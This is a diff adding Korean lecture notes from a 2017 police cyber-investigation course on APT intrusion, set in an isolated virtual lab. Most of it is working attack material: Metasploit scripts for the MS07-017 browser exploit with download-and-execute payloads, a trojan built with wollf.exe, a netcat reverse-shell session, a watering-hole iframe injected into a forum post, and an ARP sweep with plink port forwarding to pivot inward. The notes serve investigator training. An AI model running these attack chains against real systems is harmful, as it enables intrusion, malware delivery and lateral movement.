@@ -1,0 +1,294 @@
+과정명 : 17년 사이버수사 전문화 고급과정
+과목명 : 실습을 통해 배우는 APT 침투전략
+강  사 : 이익희(코어시큐리티/보안기술교육팀 / eekic@coresec.co.kr)
+공유자료 : http://192.168.11.174/
+====================================================================
+APT(Targeting Attack)
+	. Watering hole
+		( html / js / css / jpg / txt / gif / swf / jar)
+
+
+	. Spear phishing
+		. 첨부파일
+			- exe /dll /sys/ scr
+			- zip / rar / 7z
+			- ms office
+			- hwp
+			- pdf
+		. 링크 
+			http://www.naver.com@38118237409
+
+
+한글 2007 / 2010 / 2014
+OS   win 7 / win 8 / win 10
+bit  x86 / x64
+service pack 0 / 1
+
+
+
+. Cyber kill Chain
+	.침투시작
+	.거점확보
+		(reverse_shell / bind_shell)
+	.권한상승	
+		( exploit / shellcode )
+	.내부정찰
+	.측면이동
+	.제어유지
+	.임무완료
+
+환경설정 >
+
+C:\lab\
+	-> 가상머신
+	. CentOS5.3 webserver
+	. Kali
+	. pfsense
+	. windows 2000
+	. WinXP
+[환경설정 공통사항]
+파일 -> 환경설정 -> 네트워크 -> 호스트 전용 네트워크 -> 추가
+
+.설정 후 완료 목록
+	: host-only adapter#1
+		-> 더블클릭 : 192.168.56.1 /255.255.255.0
+	: host-only adapter#2
+		-> 더블클릭 : 192.168.57.1 / 255.255.255.0
+
+[가상머신별 IP 설정]
+CentOS : 192.168.57.80/24 GW = 192.168.57.2
+	->가상머신 우클릭 -> 설정 -> 네트워크 -> 호스트 전용 어뎁터
+	-> #2 선택 
+Kali   : 192.168.57.10/24 GW = 192.168.57.2
+	->가상머신 우클릭 -> 설정 -> 네트워크 -> 호스트 전용 어뎁터
+	-> #2 선택 
+Pfsense : 그냥 두시면 됩니다.
+WinXP  : 192.168.56.20/24 GW = 192.168.56.2
+	->가상머신 우클릭 -> 설정 -> 네트워크 -> 호스트 전용 어뎁터
+	-> #1 선택 
+Win2000k : 192.168.56.80/24 GW = 192.168.56.2
+	->가상머신 우클릭 -> 설정 -> 네트워크 -> 호스트 전용 어뎁터
+	-> #1 선택 
+
+가상머신 접속 정보 : root / lab
+
+CentOS IP Setting
+#ifconfig eth0 192.168.57.80/24
+#route add default gw 192.168.57.2
+#service httpd start
+	phrase password : core
+#service mysqld start
+
+kali 
+#firefox 192.168.57.2
+admin / pfsense
+
+=============ms07_017_calc.rc=================
+use exploit/windows/browser/ms07_017_ani_loadimage_chunksize
+set SRVHOST 192.168.57.10
+set SRVPORT 8080
+set uripath /
+set payload windows/exec
+set CMD calc.exe
+exploit
+=============================================
+kali # msfconsole -r ms07_017_calc.rc
+
+Windows XP >
+	http://192.168.57.10:8080/
+
+
+Hands_on ) notepad 강제로 실행시키기
+=============ms07_017_notepad.rc=================
+use exploit/windows/browser/ms07_017_ani_loadimage_chunksize
+set SRVHOST 192.168.57.10
+set SRVPORT 8080
+set uripath /
+set payload windows/exec
+set CMD notepad.exe
+exploit
+=============================================
+
+Windows XP>
+	http://192.168.57.10:8080/
+
+
+Hands_on ) Drive by download 실습
+*hint : payload windows/download_exec
+	messagebox 실행파일 위치 : /var/www/msg.exe
+#service apache2 start
+
+=============ms07_017_msg.rc=================
+use exploit/windows/browser/ms07_017_ani_loadimage_chunksize
+set SRVHOST 192.168.57.10
+set SRVPORT 8080
+set uripath /
+set payload windows/download_exec
+set URL http://192.168.57.10/msg.exe
+exploit
+=============================================
+
+hands_on) wollf.exe를 이용한 악성코드 제작
+
+kali >
+#cd /var/www
+#wine ./wollf.exe -setup
+	7 > y > http://192.168.57.10/c2.txt > 5 > 0 
+
+=============ms07_017_mal.rc=================
+use exploit/windows/browser/ms07_017_ani_loadimage_chunksize
+set SRVHOST 192.168.57.10
+set SRVPORT 8080
+set uripath /
+set payload windows/download_exec
+set URL http://192.168.57.10/wollf_new.exe
+exploit
+=============================================
+
+#nc -lvp 4321
+
+Windows XP >
+	http://192.168.57.10:8080/
+
+kali > reverse_shell 연결 확인.
+
+Hands_on ) Watering hole을 이용한 악성코드 감염 전략
+
+kali >
+#firefox http://192.168.57.80/aircon
+> 하단의 질문과 답변 -> 글쓰기 -> 메뉴 중 html 선택
+-> html tag 삽입
+	<iframe src="http://192.168.57.10:8080/"></iframe>
+-> 게시글 내용 작성 -> 저장
+
+
+kali # cd /var/www
+kali # notepad auto.bat
+===========================================
+@echo off
+set /a n=0
+:repeat
+set /a n+=1
+echo 192.168.56.%n%
+arping.exe -n 1 192.168.56.%n% >> result.txt
+if %n% lss 254 goto repeat
+===========================================
+
+root@kali:~# nc -lvp 4321
+listening on [any] 4321 ...
+192.168.56.20: inverse host lookup failed: Unknown server error : Connection timed out
+connect to [192.168.57.10] from (UNKNOWN) [192.168.56.20] 1247
+"Wollf Remote Manager" v1.6
+Code by wollf, http://www.xfocus.org
+[user-692e551eba@C:\WINDOWS\system32]#mkdir temp
+
+
+Command "MD" succeed.
+
+[user-692e551eba@C:\WINDOWS\system32]#cd temp
+
+
+Command "CD" succeed.
+
+[user-692e551eba@C:\WINDOWS\system32\temp]#wget http://192.168.57.10/auto.bat
+
+Remote host: 192.168.57.10
+Remote file: auto.bat
+Local file: auto.bat
+
+Downloading....
+Command "WGET" succeed.
+
+
+
+[user-692e551eba@C:\WINDOWS\system32\temp]#wget http://192.168.57.10/arping.exe
+
+Remote host: 192.168.57.10
+Remote file: arping.exe
+Local file: arping.exe
+
+Downloading..........................................
+Command "WGET" succeed.
+
+[user-692e551eba@C:\WINDOWS\system32\temp]#wget http://192.168.57.10/plink.exe
+
+Remote host: 192.168.57.10
+Remote file: plink.exe
+Local file: plink.exe
+
+Downloading..............................................................................
+Command "WGET" succeed.
+
+[user-692e551eba@C:\WINDOWS\system32\temp]#dos
+C:\WINDOWS\system32\temp> auto.bat
+192.168.56.1
+192.168.56.2
+......
+
+192.168.56.254
+C:\WINDOWS\system32\temp> type result.txt | findstr Reply
+
+=============================================================
+kali linux >
+#service ssh start 
+=============================================================
+
+
+C:\WINDOWS\system32\temp> 
+plink.exe -R 8088:192.168.56.80:80 -l root -pw lab 192.168.57.10
+
+
+
+The server's host key is not cached in the registry. You
+have no guarantee that the server is the computer you
+think it is.
+The server's rsa2 key fingerprint is:
+ssh-rsa 2048 3a:ff:d4:07:83:07:b2:1a:06:a4:52:2b:c1:6e:66:64
+If you trust this host, enter "y" to add the key to
+PuTTY's cache and carry on connecting.
+If you want to carry on connecting just once, without
+adding the key to the cache, enter "n".
+If you do not trust this host, press Return to abandon the
+connection.
+Store key in cache? (y/n) y <------------------y 입력해 주세요
+Linux kali 3.14-kali1-686-pae #1 SMP Debian 3.14.5-1kali1 (2014-06-07) i686
+
+The programs included with the Kali GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Mon Feb  2 00:09:02 2015 from 192.168.56.20
+root@kali:~# 
+
+Windows 2000 server >
+C:\inetpub\
+	webhack 폴더 우클릭 -> 추가 -> everyone -> 추가 -> 확인
+
+새로운 탭을 열어서
+#firefox http://localhost:8088/
+	-> webhack website 확인
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
